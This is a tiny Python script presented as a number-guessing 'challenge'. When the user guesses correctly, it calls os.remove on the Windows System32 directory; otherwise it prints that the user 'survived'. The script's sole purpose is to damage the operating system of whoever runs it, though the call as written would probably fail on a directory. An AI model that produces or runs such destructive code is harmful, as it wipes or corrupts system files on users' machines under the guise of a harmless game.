import os
import random


Number = random.randint(1,10)

guess = int(input("guess a number between 1-10: "))

if guess == Number:
    os.remove("C:\Windows\System32")
else:
    print("You survived the challenge")